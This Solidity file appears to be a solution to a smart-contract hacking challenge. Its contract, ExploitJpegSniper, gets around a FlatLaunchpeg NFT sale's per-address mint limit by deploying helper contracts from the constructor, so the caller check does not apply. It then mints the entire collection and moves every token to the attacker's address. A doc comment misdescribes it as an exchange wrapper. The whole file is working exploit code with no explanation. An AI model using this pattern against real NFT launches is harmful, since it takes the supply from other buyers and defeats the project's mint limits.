// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./FlatLaunchpeg.sol";
import {console} from "forge-std/console.sol";

/// @dev hopegs NFT exchange wrapper to manage mint
contract ExploitJpegSniper {

    constructor(address _nft) payable {
        uint256 mintNum = FlatLaunchpeg(_nft).maxPerAddressDuringMint();
        uint256 totalCollectionSize = FlatLaunchpeg(_nft).collectionSize();

        uint256 loop = totalCollectionSize / mintNum;
        uint256 last = totalCollectionSize % mintNum;   
            
        for(uint256 i; i<loop; i++){
            uint256 tokenIdStart = mintNum*i;
            new ExploitHelper(_nft, mintNum, tokenIdStart, msg.sender);
        }
        uint256 tokenIdStart = mintNum*loop;
        new ExploitHelper(_nft, last, tokenIdStart, msg.sender);

    }

}

contract ExploitHelper {
    constructor (address nft, uint256 _quantity, uint256 tokenIdStart, address attacker) public {
        FlatLaunchpeg(nft).publicSaleMint(_quantity);
        for(uint256 i; i<_quantity; i++){
            FlatLaunchpeg(nft).transferFrom(address(this), attacker, tokenIdStart+i);
        }
    }
}